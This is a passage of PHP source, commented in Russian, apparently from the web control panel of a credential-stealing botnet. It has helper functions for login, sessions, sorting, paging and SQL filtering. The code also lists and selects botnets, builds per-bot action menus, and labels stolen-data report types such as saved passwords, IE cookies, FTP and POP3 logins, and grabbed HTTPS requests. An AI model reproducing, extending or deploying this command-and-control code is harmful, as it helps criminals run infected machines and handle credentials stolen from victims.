if(!file_exists('system/'.CURRENT_MODULE.'.lng.'.$_USER_DATA['language'].'.php'))$_USER_DATA['language'] = DEFAULT_LANGUAGE;
require_once('system/'.CURRENT_MODULE.'.lng.'.$_USER_DATA['language'].'.php'); 

//Запуск модуля.
require_once('system/'.CURRENT_MODULE.'.php'); 
die();

///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
  Получение ошибки MySQL с формотированием HTML и префиксом.
  
  Return - string, ошибка MySQL.
*/
function mysql_error_ex()
{
  return 'MySQL error: '.htmlentities_ex(mysql_error());
}

/*
  Создание временного файла.
  
  IN $prefix - string, префикс файла.
  
  Return     - mixed, имя нового временного файла или false в случае неудачи.
*/
function CreateTempFile($prefix)
{
  @mkdir('tmp', 0777);
  return @tempnam('tmp', $prefix);
}

/*
  Добавление заголовков для загрузки данных в виде файла.
  
  IN $name - string, конечное имя файла.
  IN $size - размер файла.
*/
function HTTPDownloadHeaders($name, $size)
{
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename='.basename_ex($name));
  header('Content-Transfer-Encoding: binary');
  header('Content-Length: '.$size);
  HTTPNoCacheHeaders();
}

/*
  Преобразование BLT_* в строку.
  
  IN $type - int, BLT_* для преобразование.
  
  Return   - string, строкове представление BLT_*.
*/
function BltToLng($type) 
{
  switch($type)
  {
    case BLT_PROTECTED_STORAGE: return LNG_BLT_PROTECTED_STORAGE;
    case BLT_COOKIES_IE:        return LNG_BLT_COOKIES_IE;
    case BLT_FILE:              return LNG_BLT_FILE;
    case BLT_HTTP_REQUEST:      return LNG_BLT_HTTP_REQUEST;
    case BLT_HTTPS_REQUEST:     return LNG_BLT_HTTPS_REQUEST;
    case BLT_LOGIN_FTP:         return LNG_BLT_LOGIN_FTP;
    case BLT_LOGIN_POP3:        return LNG_BLT_LOGIN_POP3;
    case BLT_GRABBED_UI:        return LNG_BLT_GRABBED_UI;
    case BLT_GRABBED_HTTP:      return LNG_BLT_GRABBED_HTTP;
    case BLT_GRABBED_WSOCKET:   return LNG_BLT_GRABBED_WSOCKET;
    case BLT_GRABBED_OTHER:     return LNG_BLT_GRABBED_OTHER;
  }
  return LNG_BLT_UNKNOWN;
}

/*
  Заменитель fnmatch для Windows.
  
  IN $pattern - string, маска.
  IN $string  - string, строка.
  
  Return      - bool, true - в случаи совпадения, или иначе false.
*/
if(!function_exists('fnmatch'))
{
  function fnmatch($pattern, $string)
  {
    return @preg_match('#^'.strtr(preg_quote($pattern, '#'), array('\\*' => '.*', '\\?' => '.?')).'$#i', $string);
  }
}

/*
  Определяет сущетвуют ли, пробельные символы в строке.
  
  IN $str - string, строка для проверки.
  
  Return  - true - если пробельные символы сущетвуют,
            false - если пробельные символы не сущетвуют.
*/
function spacechars_exists($str)
{
  return strpbrk($str, "\x20\x09\x0A\x0B\x0D") === false ? false : true;
}

/*
  Преобразование логического выражения в массив.
  
  IN $exp - string, выражение.
  
  Return  - array, результат.
*/
function ExpToArray($exp)
{
  $list = array();
  $len = strlen($exp);
  
  for($i = 0; $i < $len; $i++)
  {
    $cur = ord($exp[$i]);
    
    //Пропускаем пробелные символы.
    if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD))continue;
        
    //Проверяем ковычку.
    if($cur == 0x22 || $cur == 0x27)
    {
      for($j = $i + 1; $j < $len; $j++)if(ord($exp[$j]) == $cur)
      {
        //Подсчитываем количество слешей.
        $c = 0;
        for($k = $j - 1; ord($exp[$k]) == 0x5C; $k--)$c++;
        if($c % 2 == 0)break; //При четном количестве слешей до ковычки, наша ковычка это не спец. символ.
      }
      if($j != $len)$i++; //Если не достигнут конец, убираем первую ковычку.
      
      $type = 1;
    }
    //Простое копирование до первого пробела.
    else
    {
      for($j = $i + 1; $j < $len; $j++)
      {
        $cur = ord($exp[$j]);
        if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD))break;
      }
      
      $type = 0;
    }

    $list[] = array(substr($exp, $i, $j - $i), $type);
    $i = $j;
  }
  
  return $list;
}

/*
  Сравнение строки с логическим выражением.
  
  IN $str    - string, строка.
  IN $exp    - string, выражение.
  IN $cs     - bool, если true, то учетом регистра(BINARY), иначе без учета регистра.
  IN $strong - bool, см. код. 
  
  Return     - true - если строка подходит для выражения,
               false  - в противном случаи.
*/

function MatchStringInExpString($str, $exp, $cs, $strong)
{
  $exp = trim($exp);
  if($exp == '' || $exp == '*')return true;
  
  $list = ExpToArray($exp);
  
  //Настройка pcre.
  $pcre_pre = ($strong ? '#^' : '#');
  $pcre_aft = ($strong ? '$#' : '#').($cs ? 'u' : 'iu');

  //Обрабатыаем результат.
  $q_prev = $q_cur = 0;
  $retVal = false;
  
  foreach($list as $item)
  {
    if($item[1] == 0)
    {
      $skip = 0;
      if(strcmp($item[0],       'OR') === 0)$q_cur = 0;
      else if(strcmp($item[0], 'AND') === 0)$q_cur = 1;
      else if(strcmp($item[0], 'NOT') === 0)$q_cur = 2;
      else $skip = 1;
      if($skip == 0){$q_prev = $q_cur; continue;}
    }
    
    //Сравниваем.
    $r = preg_match($pcre_pre.strtr(preg_quote($item[0], '#'), array('\\*' => '.*', '\\?' => '.?')).$pcre_aft, $str);
    
    //Не уверен за логику.
    switch($q_cur)
    {
      case 0: //OR
        if($r > 0)$retVal = true;
        break;
      
      case 1: //AND
        if($r > 0)break;
        return false;
      
      case 2: //NOT
        if($r > 0)return false;
        break;
    }
  }
  
  return $retVal;
}

/*
  Преобразование логическим выражения в SQL запрос для WHERE.
  
  IN $exp    - string, выражение.
  IN $column - string, название столбца.
  IN $cs     - bool, если true, то учетом регистра, иначе без учета регистра.
  IN $strong - bool, см. код. 
  
  Return     - string, запрос.
*/
function ExpToSQL($exp, $column, $cs, $strong)
{
  $exp = trim($exp);
  if($exp == '' || $exp == '*')return '';
  
  $list = ExpToArray($exp);
  
  //Обрабатыаем результат.
  $query  = '';
  $q_prev = $q_cur = ' OR ';
  $q_addv = ' ';

  foreach($list as $item)
  {
    if($item[1] == 0)
    {
      $skip = 0;
      if(strcmp($item[0], 'OR') === 0)      {$q_cur = ' OR ';  $q_addv = ' ';}
      else if(strcmp($item[0], 'AND') === 0){$q_cur = ' AND '; $q_addv = ' ';}
      else if(strcmp($item[0], 'NOT') === 0){$q_cur = ' AND '; $q_addv = ' NOT ';}
      else $skip = 1;
      
      if($skip == 0)
      {
        if($q_cur != $q_prev && !empty($query))$query = '('.$query.')';
        $q_prev = $q_cur;
        continue;
      }
    }
    
    $s = str_replace(array('%', '_'), array('\\\\%', '\\\\_'), $item[0]);
    
    //Подменяем симолы *, ?.
    $len = strlen($s);
    for($i = 0; $i < $len; $i++)if(($c = ord($s[$i])) == 0x2A || $c == 0x3F)
    {
      //Подсчитываем количество слешей.
      $сc = 0;
      for($k = $i - 1; $k >= 0 && ord($s[$k]) == 0x5C; $k--)$сc++;
      
      //Подменяем.
      if($сc % 2 == 0)$s[$i] = $c == 0x2A ? '%' : '_';
    }
    
    $s = stripslashes($s);
    if(!$strong)$s = '%'.$s.'%';
    $query .= (empty($query) ? '' : $q_cur).$column.$q_addv.'LIKE'.($cs ? ' BINARY' : '').' \''.addslashes($s).'\'';
  }
  
  return '('.$query.')';
}

/*
  Проверяет, является ли путь безопасным (отсутвие символов '\', '/', '\0').
  
  IN $str -  string, строка для проверки.
  
  Return  - bool, true - если пусть безопасный, false - если путь не безопасный.
*/
function SafePath($str)
{
  return (strpos($str, "/") === false && strpos($str, "\\") === false && strpos($str, "\0") === false);
}

/*
  Вывод форму логина.
  
  IN $show_error - bool, выводить ли сообшение о неверном имени/пароле.
*/
function ShowLoginForm($show_error)
{
  $page  = $show_error ? THEME_STRING_FORM_ERROR_1_BEGIN.'Bad user name or password.'.THEME_STRING_FORM_ERROR_1_END : '';
  $page .= 
  str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('login', QUERY_STRING_BLANK_HTML.'login', ''), THEME_FORMPOST_BEGIN).
  str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Login'), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', 'User name:', THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array('', 'user', '255', '200px'), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', 'Password:', THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array('', 'pass', '255', '200px'), THEME_DIALOG_ITEM_INPUT_PASS).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          THEME_DIALOG_ITEM_EMPTY.
          str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'remember', '', 'Remember (MD5 cookies)'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END.
    str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array('Submit', ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
    THEME_DIALOG_ACTIONLIST_END.
  THEME_DIALOG_END;
  
  ThemeSmall('login', $page.THEME_FORMPOST_END, 0, 0, 0);
}

/*
  Создание списка доступных ботнетов в THEME_DIALOG_ITEM_LISTBOX.
  
  IN $current_botnet - string, имя текущего ботнета или '', если ботнет не определен.
  IN $adv_query      - дополнительные данные в HTTP-запросе смены ботнета.
  
  Return             - string, ListBox с именем 'botnet' и кнопкой смены ботнета.
*/
function BotnetsToListBox($current_botnet, $adv_query)
{
  $adv_query = htmlentities_ex($adv_query);
  $botnets = str_replace(array('{NAME}', '{WIDTH}'), array('botnet', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).str_replace(array('{VALUE}', '{TEXT}'), array('', LNG_BOTNET_ALL), THEME_DIALOG_ITEM_LISTBOX_ITEM);
  if(($r = @mysql_query('SELECT DISTINCT botnet FROM botnet_list')))while(($m = @mysql_fetch_row($r)))if($m[0] != '')
  {
    $botnets .= str_replace(array('{VALUE}',        '{TEXT}'),
                            array(htmlentities_ex(urlencode($m[0])), htmlentities_ex(mb_substr($m[0], 0, BOTNET_MAX_CHARS))),
                            strcmp($current_botnet, $m[0]) === 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM);
  }
  $botnets .= 
  THEME_DIALOG_ITEM_LISTBOX_END.'&#160;'.
  str_replace(array('{TEXT}',               '{JS_EVENTS}'),
              array(LNG_BOTNET_APPLY, ' onclick="var botnet = document.getElementById(\'botnet\'); window.location=\''.QUERY_STRING_HTML.$adv_query.'&amp;botnet=\' + botnet.options[botnet.selectedIndex].value;"'),
              THEME_DIALOG_ITEM_ACTION);
  return $botnets;
}

/*
  Создание таблицы со списокм номеров страниц.
  
  IN $total_pages   - int, количетсво страниц.
  IN $current_page  - int, текущая страница.
  IN $js            - string, JavaScript для события onclick, где {P} - номер страницы.
  
  Return            - string, список страниц.
*/
function ShowPageList($total_pages, $current_page, $js)
{
  $list          = array();
  $visible_pages = 5; //Радиус видимых страниц.
  
  //Подсчитываем видимые страницы.
  $min_visible   = $current_page - $visible_pages;
  $max_visible   = $current_page + $visible_pages;
  
  if($min_visible < 1)                $max_visible -= $min_visible - 1;              //!Увеличиваем на чисило <1
  else if($max_visible > $total_pages)$min_visible -= ($max_visible - $total_pages); //Уменьшаем на число вышедшее за $total_pages.
  
  $q_min = false;
  $q_max = false;
  
  for($i = 1; $i <= $total_pages; $i++)
  {
    //Текщая страница.
    if($i == $current_page)$list[] = array($i, 0);
    else
    {
      //Невидимые страницы.
      if($i != 1 && $i != $total_pages && ($i < $min_visible || $i > $max_visible))
      {
        if($i < $min_visible && $q_min == false)
        {
          $list[] = array(0, 0);
          $q_min = true;
        }
        else if($i > $max_visible && $q_max == false)
        {
          $list[] = array(0, 0);
          $q_max = true;
        }
      }
      //Видимые страницы.
      else $list[] = array($i, str_replace('{P}', $i, $js));
    }
  }
  
  return ThemePageList($list,
                       $current_page > 1            ? str_replace('{P}', 1,                 $js) : 0,
                       $current_page > 1            ? str_replace('{P}', $current_page - 1, $js) : 0,
                       $current_page < $total_pages ? str_replace('{P}', $total_pages,      $js) : 0,
                       $current_page < $total_pages ? str_replace('{P}', $current_page + 1, $js) : 0
                      );
}

/*
  Создание пунктов меню для JavaScript из $_BOT_MENU.
  
  IN $name - string, имя меню.
  
  Return   - string, переменная JavaScript с соедржимым меню.
*/
function GetBotJSMenu($name)
{
  global $_BOT_MENU;
  $output = '';
  $i = 0;
  
  foreach($_BOT_MENU as $item)
  {
    if($i++ != 0)$output .= ', ';
    if($item[0] === 0)$output .= '[0]';
    else $output .= '[\''.addjsslashes(htmlentities_ex($item[1])).'\', \''.addjsslashes(QUERY_SCRIPT_HTML.'?botsaction='.htmlentities_ex(urlencode($item[0])).'&amp;bots[]=$0$').'\']';
  }
  
  return 'var '.$name.' = ['.$output.'];';
}

/*
  Создание попап меню для бота.
  
  IN $botid   - string, бот ID. Применять htmlentities_ex или urlencode нельзя.
  IN $meuname - string, название меню. Проще говоря имя перменной в JavaScript созданной через GetBotJSMenu.
  
  Return    - string, попап меню
*/

function BotPopupMenu($botid, $menuname)
{
  if(!isset($GLOBALS['_next_bot_popupmenu__']))$GLOBALS['_next_bot_popupmenu__'] = 100;
  return str_replace(array('{ID}',                              '{MENU_NAME}', '{BOTID_FOR_URL}',                  '{BOTID}'),
                     array($GLOBALS['_next_bot_popupmenu__']++, $menuname,     htmlentities_ex(urlencode($botid)), htmlentities_ex($botid)),
                     THEME_POPUPMENU_BOT);
}

/*
  Создние заголовка колонки, полежащей сортировке.
  
  IN $text   - string, название колонки.
  IN $col_id - int, ID колонки.
  IN $num    - bool, true - колонка служит для вывода чисел, false - колонка служит для вывода текста.
  
  Retrurn    - string, колонка.
*/
function WriteSortColumn($text, $col_id, $num)
{
  global $_SORT_ORDER, $_SORT_COLUMN_ID;
  
  if($num)$theme = $_SORT_COLUMN_ID == $col_id ? ($_SORT_ORDER == 0 ? THEME_LIST_HEADER_R_SORT_CUR_ASC : THEME_LIST_HEADER_R_SORT_CUR_DESC) : THEME_LIST_HEADER_R_SORT;
  else    $theme = $_SORT_COLUMN_ID == $col_id ? ($_SORT_ORDER == 0 ? THEME_LIST_HEADER_L_SORT_CUR_ASC : THEME_LIST_HEADER_L_SORT_CUR_DESC) : THEME_LIST_HEADER_L_SORT;
  
  return str_replace(
                     array('{COLUMNS_COUNT}', '{URL}', '{JS_EVENTS}', '{TEXT}', '{WIDTH}'),
                     array(1,                 '#',     ' onclick="return SetSortMode('.$col_id.', '.($_SORT_COLUMN_ID == $col_id ? ($_SORT_ORDER == 0 ? 1 : 0) : $_SORT_ORDER).')"',  $text, 'auto'),
                     $theme
                    );
}

/*
  JS код для смены сортировки.
  
  IN $url - string, url.
  
  Retutn - string, js-код.
*/
function JSSetSortMode($url)
{
  return "function SetSortMode(mode, ord){window.location='{$url}&smode=' + mode +'&sord=' + ord; return false;}\r\n";
}

/*
  Код для JS для инициализации XMLHttpRequest.
  
  IN $var - string, название перменной для объекта.
  
  Retutn - string, js-код.
*/
function JSXMLHttpRequest($var)
{
  return 
  "try{{$var} = new ActiveXObject('Msxml2.XMLHTTP');}".
  "catch(e1)".
  "{".
    "try{{$var} = new ActiveXObject('Microsoft.XMLHTTP');}".
    "catch(e2){{$var} = false;}".
  "}".
  "if(!{$var} && typeof XMLHttpRequest != 'undefined'){{$var} = new XMLHttpRequest();}".
  "if(!{$var})alert('ERROR: Failed to create XMLHttpRequest.');";
}

/*
  JS код для массового управления метакми типа checkbox.
  
  IN $form - string, название формы для обработки.
  IN $cb   - string, главный checkbox.
  IN $cb   - string, название зависимых checkbox'ов.
  
  Retutn - string, js-код.
*/
function JSCheckAll($form, $cb, $arr)
{
  return 
  "function CheckAll(){".
  "var bl = document.forms.namedItem('{$form}').elements;".
  "var ns = bl.namedItem('{$cb}').checked;".
  "for(var i = 0; i < bl.length; i++)if(bl.item(i).name == '{$arr}')bl.item(i).checked = ns;".
  "}\r\n";
}

/*
  Получает режим сортировки из GET-запроса.
  
  IN $sm - array, список досутпных сортировок.
  
  Return - string, коцовка URL для текущей стортировки.
*/
function AssocateSortMode($sm)
{
  $GLOBALS['_SORT_COLUMN']    = $sm[0]; //Колонка
  $GLOBALS['_SORT_COLUMN_ID'] = 0; //ID колонки.
  $GLOBALS['_SORT_ORDER']     = 0; //Направление, 0 = ASC, 1 = DESC

  if(!empty($_GET['smode']) && is_numeric($_GET['smode']))
  {
    if(isset($sm[$_GET['smode']]))
    {
      $GLOBALS['_SORT_COLUMN']    = $sm[$_GET['smode']];
      $GLOBALS['_SORT_COLUMN_ID'] = intval($_GET['smode']);
    }
  }

  if(!empty($_GET['sord']) && is_numeric($_GET['sord']))$GLOBALS['_SORT_ORDER'] = $_GET['sord'] == 1 ? 1 : 0;

  if($GLOBALS['_SORT_COLUMN_ID'] !== 0 || $GLOBALS['_SORT_ORDER'] !== 0)return '&smode='.$GLOBALS['_SORT_COLUMN_ID'].'&sord='.$GLOBALS['_SORT_ORDER'];
  return '';
}

/*
  Получение списка всех директорий.
  
  IN $path - string, путь для поиска.
  
  Return   - array, список диреторий,
             или false в случаи ошибки.
*/
function getdirs($path)
{
  $r = array();
  if(($dh = @opendir($path)) === false)return false;
  else
  {
    while(($file = @readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0 && @is_dir($path.'/'.$file))$r[] = $file;
    @closedir($dh);
  }
  
  return $r;
}

/*
  Удаление файлов и папок.
  
  IN $path - string, полный путь.
  
  Return   - true - если путь успешно удален,
             false - в случаи ошибки.
*/
function ClearPath($path)
{
  @chmod($path, 0777);
  
  if(@is_dir($path))
  {
    if(($dh = @opendir($path)) !== false)
    {
      while(($file = readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0)
      {
        if(!ClearPath($path.'/'.$file))return false;
      }
      @closedir($dh);
    }
    if(!@rmdir($path))return false;
  }
  else if(is_file($path))
  {
    if(!@unlink($path))return false;
  }
  
  return true;
}

/*
  Отимизирует меню, удаляя из него запрешенные пункты.
  
  IN OUT $menu   - array, меню для обработки.
  IN $allow_fsep - bool, сохранить верхнии разделители.
*/
function OptimizeMenu(&$menu, $save_fsep)
{
  global $_USER_DATA;

  foreach($menu as $key => $item)foreach($item[2] as $r)if(empty($_USER_DATA[$r])){unset($menu[$key]); break;}

  //Удаляем лишнии разделители.
  $sep = -1;
  $i = 0;
  foreach($menu as $key => $item)
  {
    if($item[0] === 0)
    {
      if($i == 0 && !$save_fsep)unset($menu[$key]);
      else if($sep !== -1)unset($menu[$sep]);
      $sep = $key;
    }
    else
    {
      $sep = -1;
      $i++;
    }
  }
  
  if($sep !== -1)unset($menu[$sep]);
}

///////////////////////////////////////////////////////////////////////////////
// Управление сессией.
///////////////////////////////////////////////////////////////////////////////

/*
  Захват сессии
*/
$_SESSIONIN = 0;
function LockSession()
{
  global $_SESSIONIN;
  if($_SESSIONIN == 0)
  {
    @session_set_cookie_params(SESSION_LIVETIME, CP_HTTP_ROOT);
    @session_name(COOKIE_SESSION);
    @session_start();
  }
  $_SESSIONIN++;
}

/*
  Освобождение сессии
*/
function UnlockSession()
{
  global $_SESSIONIN;
  if($_SESSIONIN > 0 && --$_SESSIONIN == 0)session_write_close();
}

/*
  Уничтожение сессии
*/
function UnlockSessionAndDestroyAllCokies()
{
  global $_SESSIONIN;
  $_SESSIONIN = 0;
  if(isset($_SESSION))foreach($_SESSION as $k => $v)unset($_SESSION[$k]);
  @session_unset();
  @session_destroy();
  
  @setcookie(COOKIE_SESSION, '', 0, CP_HTTP_ROOT);
  @setcookie(COOKIE_USER,    '', 0, CP_HTTP_ROOT);
  @setcookie(COOKIE_PASS,    '', 0, CP_HTTP_ROOT);
}
?>